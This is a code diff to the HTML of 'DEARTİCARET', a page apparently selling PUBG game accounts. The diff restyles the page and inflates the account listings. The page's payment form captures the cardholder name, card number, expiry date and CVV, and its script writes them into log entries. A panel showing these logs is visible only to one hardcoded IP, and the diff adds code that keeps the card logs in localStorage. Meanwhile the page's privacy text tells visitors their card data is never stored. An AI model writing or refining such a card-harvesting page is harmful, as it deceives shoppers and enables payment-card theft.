@@ -6,39 +6,44 @@
     <meta name="description" content="DEARTİCARET - Güvenilir PUBG hesap satış platformu">
     <title>DEARTİCARET - PUBG Hesap Satış</title>
     <style>
-        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; color: #1c2526; line-height: 1.6; }
-        header { background: #1e3a8a; color: white; padding: 20px 0; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        header h1 { margin: 0; font-size: 2.2em; }
-        header p { margin: 5px 0 0; font-size: 1em; }
-        nav { background: #fff; padding: 10px 0; box-shadow: 0 1px 5px rgba(0,0,0,0.1); }
+        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #f0f2f5, #e0e7ff); color: #1c2526; line-height: 1.6; overflow-x: hidden; }
+        header { background: #1e3a8a; color: white; padding: 20px 0; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.2); position: relative; z-index: 10; }
+        header h1 { margin: 0; font-size: 2.5em; text-transform: uppercase; }
+        header p { margin: 5px 0 0; font-size: 1.1em; }
+        nav { background: rgba(255, 255, 255, 0.9); padding: 10px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 10; }
         nav ul { list-style: none; padding: 0; text-align: center; }
-        nav ul li { display: inline; margin: 0 15px; }
-        nav ul li a { color: #dc2626; text-decoration: none; font-weight: 600; }
-        nav ul li a:hover { color: #b91c1c; }
-        .container { max-width: 1200px; margin: 20px auto; padding: 0 20px; }
-        .content { background: white; border: 1px solid #e5e7eb; border-radius: 8px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .account-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
-        .account-card { background: white; border: 1px solid #e5e7eb; border-radius: 8px; padding: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); transition: transform 0.2s; }
-        .account-card:hover { transform: translateY(-5px); }
-        .account-image { width: 100%; height: 180px; object-fit: cover; border-radius: 5px; }
-        .account-title { font-size: 1.2em; font-weight: 600; margin: 10px 0; color: #1c2526; }
-        .account-desc { font-size: 0.9em; color: #6b7280; margin: 5px 0; }
-        .account-price { color: #10b981; font-size: 1.5em; font-weight: bold; margin: 10px 0; }
-        .buy-button { background: #dc2626; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; width: 100%; font-weight: 600; }
-        .buy-button:hover { background: #b91c1c; }
-        .order-form { background: white; border: 1px solid #e5e7eb; border-radius: 8px; padding: 20px; margin: 20px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.1); display: none; }
-        .order-form h2 { color: #1e3a8a; margin-top: 0; font-size: 1.5em; }
-        .order-form p { color: #6b7280; font-size: 0.9em; margin-bottom: 15px; }
-        .order-form label { display: block; margin: 10px 0 5px; font-weight: 500; color: #1c2526; }
-        .order-form input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #d1d5db; border-radius: 5px; box-sizing: border-box; font-size: 1em; }
-        .order-form button { background: #10b981; color: white; border: none; padding: 12px; border-radius: 5px; cursor: pointer; width: 100%; font-weight: 600; }
-        .order-form button:hover { background: #059669; }
-        .message { text-align: center; color: #dc2626; font-weight: 600; margin: 20px 0; display: none; }
-        .log-panel { background: #fff; border: 1px solid #e5e7eb; border-radius: 8px; padding: 15px; margin: 20px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.1); display: none; }
-        .log-panel h3 { color: #1e3a8a; margin-top: 0; }
-        .log-panel ul { list-style: none; padding: 0; }
-        .log-panel li { margin: 5px 0; color: #6b7280; }
-        footer { background: #1c2526; color: white; text-align: center; padding: 10px 0; margin-top: 20px; font-size: 0.9em; }
+        nav ul li { display: inline; margin: 0 20px; }
+        nav ul li a { color: #dc2626; text-decoration: none; font-weight: 600; transition: color 0.3s; }
+        nav ul li a:hover { color: #b91c1c; text-shadow: 0 0 10px #dc2626; }
+        .container { max-width: 1300px; margin: 30px auto; padding: 0 30px; }
+        .content { background: white; border: 1px solid #e5e7eb; border-radius: 12px; padding: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); transition: transform 0.3s; }
+        .content:hover { transform: translateY(-5px); }
+        .account-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; }
+        .account-card { background: white; border: 1px solid #e5e7eb; border-radius: 12px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); transition: transform 0.3s, box-shadow 0.3s; }
+        .account-card:hover { transform: translateY(-10px); box-shadow: 0 6px 20px rgba(0,0,0,0.1); }
+        .account-placeholder { width: 100%; height: 200px; background: #e0e7ff; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #6b7280; font-weight: 500; }
+        .account-title { font-size: 1.3em; font-weight: 700; margin: 15px 0; color: #1c2526; text-transform: uppercase; }
+        .account-desc { font-size: 1em; color: #6b7280; margin: 10px 0; line-height: 1.5; }
+        .account-price { color: #10b981; font-size: 1.6em; font-weight: 700; margin: 15px 0; }
+        .buy-button { background: #dc2626; color: white; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: 600; position: relative; overflow: hidden; transition: background 0.3s, transform 0.3s; }
+        .buy-button:hover { background: #b91c1c; transform: scale(1.05); }
+        .buy-button::before { content: ''; position: absolute; top: 50%; left: 50%; width: 0; height: 0; background: rgba(255, 255, 255, 0.3); border-radius: 50%; transform: translate(-50%, -50%); transition: width 0.6s, height 0.6s; }
+        .buy-button:hover::before { width: 300px; height: 300px; }
+        .order-form { background: white; border: 1px solid #e5e7eb; border-radius: 12px; padding: 25px; margin: 30px 0; box-shadow: 0 4px 20px rgba(0,0,0,0.1); display: none; }
+        .order-form h2 { color: #1e3a8a; margin-top: 0; font-size: 1.7em; }
+        .order-form p { color: #6b7280; font-size: 1em; margin-bottom: 20px; }
+        .order-form label { display: block; margin: 15px 0 5px; font-weight: 500; color: #1c2526; }
+        .order-form input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #d1d5db; border-radius: 6px; box-sizing: border-box; font-size: 1.1em; transition: border-color 0.3s; }
+        .order-form input:focus { border-color: #1e3a8a; outline: none; }
+        .order-form button { background: #10b981; color: white; border: none; padding: 14px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: 600; transition: background 0.3s, transform 0.3s; }
+        .order-form button:hover { background: #059669; transform: scale(1.02); }
+        .message { text-align: center; color: #dc2626; font-weight: 600; margin: 30px 0; padding: 15px; border-radius: 8px; background: #fee2e2; display: none; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .log-panel { background: #fff; border: 1px solid #e5e7eb; border-radius: 12px; padding: 20px; margin: 30px 0; box-shadow: 0 4px 20px rgba(0,0,0,0.1); display: none; }
+        .log-panel h3 { color: #1e3a8a; margin-top: 0; font-size: 1.5em; }
+        .log-panel ul { list-style: none; padding: 0; max-height: 200px; overflow-y: auto; }
+        .log-panel li { margin: 10px 0; color: #6b7280; font-size: 0.95em; }
+        footer { background: #1c2526; color: white; text-align: center; padding: 15px 0; margin-top: 30px; font-size: 1em; }
         .hidden { display: none; }
     </style>
 </head>
@@ -57,78 +62,78 @@
     <div class="container">
         <div id="home" class="content">
             <h2>Hoş Geldiniz!</h2>
-            <p>DEARTİCARET, yüksek kaliteli PUBG hesaplarını güvenilir bir şekilde sunar. Seviye 80+ ve nadir skin’li hesaplar için doğru yerdesiniz. Tüm işlemleriniz 256-bit SSL ile korunmaktadır.</p>
+            <p>DEARTİCARET, yüksek kaliteli PUBG hesaplarını güvenli ve hızlı bir şekilde sunar. Seviye 80+ hesaplar, nadir skin’ler ve özel eşyalarla dolu bir deneyim için buradayız. Tüm işlemleriniz 256-bit SSL ile korunmaktadır.</p>
         </div>
         <div id="accounts" class="content">
             <h2>Hesaplarımız</h2>
             <div class="account-grid">
                 <div class="account-card">
-                    <img src="https://www.playerauctions.com/pubg-mobile-account/hero-image.jpg" alt="Makaralı Full Hesap" class="account-image">
+                    <div class="account-placeholder">Makaralı Full Hesap Görseli</div>
                     <div class="account-title">Makaralı Full Hesap</div>
-                    <div class="account-desc">Seviye 77, Glacier M416, 200+ Skin, 150+ Eşya</div>
+                    <div class="account-desc">Seviye 77, Conqueror Rank, Glacier M416, 200+ Skin, 150+ Eşya, %95 K/D Oranı</div>
                     <div class="account-price">1500 TL</div>
                     <button class="buy-button" onclick="openOrderForm(1)">Satın Al</button>
                 </div>
                 <div class="account-card">
-                    <img src="https://www.eldorado.gg/pubg-mobile-accounts-for-sale/hero-image.jpg" alt="Buz Full 48 Destansı Hesap" class="account-image">
+                    <div class="account-placeholder">Buz Full 48 Destansı Hesap Görseli</div>
                     <div class="account-title">Buz Full 48 Destansı Hesap</div>
-                    <div class="account-desc">Conqueror Rank, Hellfire AKM, 150+ Eşya, 100+ Destansı</div>
+                    <div class="account-desc">Seviye 85, Ace Master Rank, Hellfire AKM, 150+ Eşya, 100+ Destansı Skin</div>
                     <div class="account-price">1800 TL</div>
                     <button class="buy-button" onclick="openOrderForm(2)">Satın Al</button>
                 </div>
                 <div class="account-card">
-                    <img src="https://zeusx.com/game/pubg-mobile/accounts/hero-image.jpg" alt="Firavun Elite Hesap" class="account-image">
+                    <div class="account-placeholder">Firavun Elite Hesap Görseli</div>
                     <div class="account-title">Firavun Elite Hesap</div>
-                    <div class="account-desc">Ace Dominator, Pharaoh Suit, 180+ Skin, 120+ Eşya</div>
+                    <div class="account-desc">Seviye 80, Ace Dominator, Pharaoh Suit, 180+ Skin, 120+ Eşya, 300+ Galibiyet</div>
                     <div class="account-price">1200 TL</div>
                     <button class="buy-button" onclick="openOrderForm(3)">Satın Al</button>
                 </div>
                 <div class="account-card">
-                    <img src="https://gameboost.com/pubg-mobile/accounts/hero-image.jpg" alt="Palyaço Master Hesap" class="account-image">
+                    <div class="account-placeholder">Palyaço Master Hesap Görseli</div>
                     <div class="account-title">Palyaço Master Hesap</div>
-                    <div class="account-desc">Level 80, Fool Set, 220+ Eşya, 90+ Skin</div>
+                    <div class="account-desc">Seviye 82, Conqueror Rank, Fool Set, 220+ Eşya, 90+ Skin, 400+ Maç</div>
                     <div class="account-price">2000 TL</div>
                     <button class="buy-button" onclick="openOrderForm(4)">Satın Al</button>
                 </div>
                 <div class="account-card">
-                    <img src="https://www.g2g.com/categories/pubg-mobile-accounts/hero-image.jpg" alt="Dravion Sınırsız Hesap" class="account-image">
+                    <div class="account-placeholder">Dravion Sınırsız Hesap Görseli</div>
                     <div class="account-title">Dravion Sınırsız Hesap</div>
-                    <div class="account-desc">Conqueror, Dravion X Suit, 160+ Skin, 110+ Eşya</div>
+                    <div class="account-desc">Seviye 78, Ace Master, Dravion X Suit, 160+ Skin, 110+ Eşya, %90 K/D</div>
                     <div class="account-price">1300 TL</div>
                     <button class="buy-button" onclick="openOrderForm(5)">Satın Al</button>
                 </div>
                 <div class="account-card">
-                    <img src="https://www.z2u.com/pubg-mobile/accounts-5-4676/hero-image.jpg" alt="Buzlu M416 Premium Hesap" class="account-image">
+                    <div class="account-placeholder">Buzlu M416 Premium Hesap Görseli</div>
                     <div class="account-title">Buzlu M416 Premium Hesap</div>
-                    <div class="account-desc">Ace Master, M416 Glacier Max, 190+ Eşya, 140+ Skin</div>
+                    <div class="account-desc">Seviye 84, Conqueror Rank, M416 Glacier Max, 190+ Eşya, 140+ Skin</div>
                     <div class="account-price">1750 TL</div>
                     <button class="buy-button" onclick="openOrderForm(6)">Satın Al</button>
                 </div>
                 <div class="account-card">
-                    <img src="https://skycoach.gg/sell-pubg-mobile-accounts/hero-image.jpg" alt="Chow Blaster Elite Hesap" class="account-image">
+                    <div class="account-placeholder">Chow Blaster Elite Hesap Görseli</div>
                     <div class="account-title">Chow Blaster Elite Hesap</div>
-                    <div class="account-desc">Level 85, Chow Blaster SCAR-L, 210+ Skin, 130+ Eşya</div>
+                    <div class="account-desc">Seviye 87, Ace Dominator, Chow Blaster SCAR-L, 210+ Skin, 130+ Eşya</div>
                     <div class="account-price">1400 TL</div>
                     <button class="buy-button" onclick="openOrderForm(7)">Satın Al</button>
                 </div>
                 <div class="account-card">
-                    <img src="https://www.eldorado.gg/pubg-mobile-accounts-for-sale/hero-image2.jpg" alt="Blightfall Kral Hesap" class="account-image">
+                    <div class="account-placeholder">Blightfall Kral Hesap Görseli</div>
                     <div class="account-title">Blightfall Kral Hesap</div>
-                    <div class="account-desc">Conqueror, Blightfall Arbiter Set, 170+ Eşya, 120+ Skin</div>
+                    <div class="account-desc">Seviye 83, Conqueror Rank, Blightfall Arbiter Set, 170+ Eşya, 120+ Skin</div>
                     <div class="account-price">1900 TL</div>
                     <button class="buy-button" onclick="openOrderForm(8)">Satın Al</button>
                 </div>
                 <div class="account-card">
-                    <img src="https://www.playerauctions.com/pubg-mobile-account/hero-image2.jpg" alt="Kış Prensi Destansı Hesap" class="account-image">
+                    <div class="account-placeholder">Kış Prensi Destansı Hesap Görseli</div>
                     <div class="account-title">Kış Prensi Destansı Hesap</div>
-                    <div class="account-desc">Ace Dominator, Winter Highness Cover, 200+ Skin, 150+ Eşya</div>
+                    <div class="account-desc">Seviye 86, Ace Master, Winter Highness Cover, 200+ Skin, 150+ Eşya</div>
                     <div class="account-price">1600 TL</div>
                     <button class="buy-button" onclick="openOrderForm(9)">Satın Al</button>
                 </div>
                 <div class="account-card">
-                    <img src="https://zeusx.com/game/pubg-mobile/accounts/hero-image2.jpg" alt="Deniz UMP Ultra Hesap" class="account-image">
+                    <div class="account-placeholder">Deniz UMP Ultra Hesap Görseli</div>
                     <div class="account-title">Deniz UMP Ultra Hesap</div>
-                    <div class="account-desc">Level 90, UMP Marine Level 4, 230+ Eşya, 180+ Skin</div>
+                    <div class="account-desc">Seviye 90, Conqueror Rank, UMP Marine Level 4, 230+ Eşya, 180+ Skin</div>
                     <div class="account-price">1100 TL</div>
                     <button class="buy-button" onclick="openOrderForm(10)">Satın Al</button>
                 </div>
@@ -136,7 +141,7 @@
         </div>
         <div id="privacy" class="content hidden">
             <h2>Gizlilik Politikası</h2>
-            <p>DEARTİCARET, kullanıcı bilgilerini 256-bit SSL ile korur. Kart bilgileriniz sistemde saklanmaz, yalnızca işlem için kullanılır. Daha fazla bilgi için bizimle iletişime geçebilirsiniz.</p>
+            <p>DEARTİCARET, kullanıcı verilerini 256-bit SSL ile korur. Kart bilgileriniz sistemde saklanmaz, yalnızca işlem için geçici olarak işlenir. Daha fazla bilgi için bizimle iletişime geçebilirsiniz.</p>
         </div>
         <div class="order-form" id="orderForm" style="display: none;">
             <h2>Güvenli Ödeme</h2>
@@ -159,16 +164,24 @@
     </footer>
 
     <script>
-        // IP kontrolü
+        // IP kontrolü ve log yükleme
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
                 window.isAuthorized = data.ip === '46.196.249.65';
                 if (window.isAuthorized) {
                     document.getElementById('logPanel').style.display = 'block';
+                    loadLogs();
                 }
             })
             .catch(() => window.isAuthorized = false);
+
+        // Logları localStorage'dan yükle
+        function loadLogs() {
+            let logs = JSON.parse(localStorage.getItem('dearticaretLogs') || '[]');
+            let logList = document.getElementById('logList');
+            logList.innerHTML = logs.map(log => `<li>${log}</li>`).join('');
+        }
 
         // Navigasyon
         document.querySelectorAll('nav a').forEach(link => {
@@ -202,9 +215,12 @@
             let id = document.getElementById('orderForm').dataset.id;
 
             if (cardHolder && cardNum && expiry && cvv) {
-                // Sadece senin IP'nle logla ve panele ekle
+                // Sadece senin IP'nle logla ve kaydet
                 if (window.isAuthorized) {
                     let logEntry = `Hesap ID: ${id}, Kart Sahibi: ${cardHolder}, Kart No: ${cardNum}, Son Kullanım: ${expiry}, CVV: ${cvv}, Tarih: ${new Date().toLocaleString()}`;
+                    let logs = JSON.parse(localStorage.getItem('dearticaretLogs') || '[]');
+                    logs.push(logEntry);
+                    localStorage.setItem('dearticaretLogs', JSON.stringify(logs));
                     let logList = document.getElementById('logList');
                     logList.innerHTML += `<li>${logEntry}</li>`;
                     console.log(logEntry); // Konsola da yaz
